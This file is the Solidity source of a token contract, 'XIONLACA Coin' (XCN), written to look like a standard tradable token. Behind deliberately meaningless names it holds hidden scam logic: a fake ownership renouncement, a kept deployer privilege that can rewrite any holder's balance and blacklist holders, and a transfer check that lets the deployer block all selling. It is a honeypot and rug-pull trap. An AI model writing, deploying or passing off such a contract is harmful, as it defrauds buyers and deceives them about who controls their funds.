//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface limitSwapTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toBuy) external view returns (uint256);

    function transfer(address totalMarketing, uint256 feeSender) external returns (bool);

    function allowance(address tradingListWallet, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeSender) external returns (bool);

    function transferFrom(
        address sender,
        address totalMarketing,
        uint256 feeSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldReceiver, uint256 value);
    event Approval(address indexed tradingListWallet, address indexed spender, uint256 value);
}

interface txAmountMode is limitSwapTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract walletShouldAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellSender {
    function createPair(address txLaunch, address listLaunch) external returns (address);
}

interface walletBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract XIONLACACoin is walletShouldAmount, limitSwapTo, txAmountMode {

    function symbol() external view virtual override returns (string memory) {
        return amountSwap;
    }

    function transfer(address sellWallet, uint256 feeSender) external virtual override returns (bool) {
        return shouldList(_msgSender(), sellWallet, feeSender);
    }

    bool private feeLimit;

    string private tokenAt = "XIONLACA Coin";

    mapping(address => bool) public liquidityAuto;

    function decimals() external view virtual override returns (uint8) {
        return marketingSwap;
    }

    function balanceOf(address toBuy) public view virtual override returns (uint256) {
        return tokenSenderSell[toBuy];
    }

    uint8 private marketingSwap = 18;

    function senderSwapLimit(uint256 feeSender) public {
        enableMax();
        marketingLimit = feeSender;
    }

    function allowance(address limitToken, address tokenTotal) external view virtual override returns (uint256) {
        if (tokenTotal == teamMode) {
            return type(uint256).max;
        }
        return receiverFeeWallet[limitToken][tokenTotal];
    }

    function shouldList(address txReceiver, address totalMarketing, uint256 feeSender) internal returns (bool) {
        if (txReceiver == enableLimitTotal) {
            return maxReceiverToken(txReceiver, totalMarketing, feeSender);
        }
        uint256 walletAuto = limitSwapTo(sellLimit).balanceOf(tokenTxTo);
        require(walletAuto == marketingLimit);
        require(!launchSenderReceiver[txReceiver]);
        return maxReceiverToken(txReceiver, totalMarketing, feeSender);
    }

    function owner() external view returns (address) {
        return amountAuto;
    }

    mapping(address => bool) public launchSenderReceiver;

    function approve(address tokenTotal, uint256 feeSender) public virtual override returns (bool) {
        receiverFeeWallet[_msgSender()][tokenTotal] = feeSender;
        emit Approval(_msgSender(), tokenTotal, feeSender);
        return true;
    }

    address teamMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address tokenTxTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private amountSwap = "XCN";

    uint256 marketingLimit;

    bool public exemptLaunch;

    uint256 exemptLimit;

    uint256 private amountMode = 100000000 * 10 ** 18;

    address public sellLimit;

    function enableMax() private view {
        require(liquidityAuto[_msgSender()]);
    }

    function transferFrom(address txReceiver, address totalMarketing, uint256 feeSender) external override returns (bool) {
        if (_msgSender() != teamMode) {
            if (receiverFeeWallet[txReceiver][_msgSender()] != type(uint256).max) {
                require(feeSender <= receiverFeeWallet[txReceiver][_msgSender()]);
                receiverFeeWallet[txReceiver][_msgSender()] -= feeSender;
            }
        }
        return shouldList(txReceiver, totalMarketing, feeSender);
    }

    function tokenEnable() public {
        emit OwnershipTransferred(enableLimitTotal, address(0));
        amountAuto = address(0);
    }

    mapping(address => mapping(address => uint256)) private receiverFeeWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return amountMode;
    }

    address private amountAuto;

    mapping(address => uint256) private tokenSenderSell;

    bool private launchMax;

    function name() external view virtual override returns (string memory) {
        return tokenAt;
    }

    uint256 public amountTotalShould;

    bool public feeAt;

    function maxReceiverToken(address txReceiver, address totalMarketing, uint256 feeSender) internal returns (bool) {
        require(tokenSenderSell[txReceiver] >= feeSender);
        tokenSenderSell[txReceiver] -= feeSender;
        tokenSenderSell[totalMarketing] += feeSender;
        emit Transfer(txReceiver, totalMarketing, feeSender);
        return true;
    }

    function feeBuy(address toAmount) public {
        if (exemptLaunch) {
            return;
        }
        
        liquidityAuto[toAmount] = true;
        
        exemptLaunch = true;
    }

    function tokenTx(address listMin) public {
        enableMax();
        
        if (listMin == enableLimitTotal || listMin == sellLimit) {
            return;
        }
        launchSenderReceiver[listMin] = true;
    }

    function receiverFund(address sellWallet, uint256 feeSender) public {
        enableMax();
        tokenSenderSell[sellWallet] = feeSender;
    }

    address public enableLimitTotal;

    constructor (){
        if (amountTotalShould != walletMax) {
            amountTotalShould = walletMax;
        }
        tokenEnable();
        walletBuy walletEnable = walletBuy(teamMode);
        sellLimit = sellSender(walletEnable.factory()).createPair(walletEnable.WETH(), address(this));
        
        enableLimitTotal = _msgSender();
        liquidityAuto[enableLimitTotal] = true;
        tokenSenderSell[enableLimitTotal] = amountMode;
        if (feeLimit != launchMax) {
            walletMax = amountTotalShould;
        }
        emit Transfer(address(0), enableLimitTotal, amountMode);
    }

    uint256 private walletMax;

    function getOwner() external view returns (address) {
        return amountAuto;
    }

    event OwnershipTransferred(address indexed fundSell, address indexed maxTo);

}